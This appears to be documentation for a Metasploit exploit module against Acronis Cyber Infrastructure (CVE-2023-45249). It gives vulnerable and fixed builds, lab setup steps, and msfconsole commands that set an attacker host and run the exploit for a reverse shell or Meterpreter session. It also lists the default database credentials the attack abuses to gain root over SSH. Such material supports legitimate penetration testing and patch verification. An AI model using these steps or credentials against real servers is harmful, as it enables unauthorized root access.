## Vulnerable Application
Acronis Cyber Infrastructure (ACI) is an IT infrastructure solution that provides storage, compute, and network resources.
Businesses and Service Providers are using it for data storage, backup storage, creating and managing virtual machines and
software-defined networks,running cloud-native applications in production environments.
This module exploits a default password vulnerability in ACI which allow an attacker to access the ACI PostgreSQL database
and gain administrative access to the ACI Web Portal.
This opens the door for the attacker to upload ssh keys that enables root access to the appliance/server.

This attack can be remotely executed over the WAN as long as the PostgreSQL and SSH services are exposed to the outside world.
ACI versions `5.0` before build `5.0.1-61`, `5.1` before build `5.1.1-71`, `5.2` before build `5.2.1-69`, `5.3` before build `5.3.1-53`,
and `5.4` before build `5.4.4-132` are vulnerable.

The following release was tested.

**Acronis Cyber Infrastructure ISO appliances:**
* Acronis Cyber Infrastructure 4.7

## Installation steps to install the Acronis Cyber Infrastructure (ACI) appliance
* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Download [ACI iso image](https://care.acronis.com/s/article/63431-Acronis-Cyber-Infrastructure-how-to-download-ISO?language=en_US).
* Install the iso image in your virtualization engine.
* When installed, configure the VM appliance to your needs using the menu options.
* Boot up the VM and should be able to access the Acronis Cyber Infrastructure (ACI) appliance either thru the console, `ssh` on port `22`
* or via the `webui` via `http://your_aci_ip:8888`.

You are now ready to test the module.

## Verification Steps
- [ ] Start `msfconsole`
- [ ] `exploit/linux/http/acronis_cyber_infra_cve_2023_45249`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ]  `set lhost <attacker-ip>`
- [ ] `set target <0=Unix/Linux Command, 1=Interactive SSH>`
- [ ] `exploit`
- [ ] you should get a `reverse shell` or `Meterpreter` session depending on the `payload` and `target` settings

## Options

### USERNAME
This option is required and is the username (default: vstoradmin) to authenticate with the PostgreSQL database.

### PASSWORD
This option is required and is the password (default: vstoradmin) in plain text to authenticate with the PostgreSQL database.

### DATABASE
This option is required and is the database (default: keystone) which holds the ACI user and password configurations.

### DBPORT
This option is required and is PostgreSQL database port (default: 5432) to connect to the database.

### SSHPORT
This option is required and is the SSH port (default: 22) to establish a SSH session.

### STORE_CRED
This option is optional (default: true) and stores the new created admin credentials in the msf database.
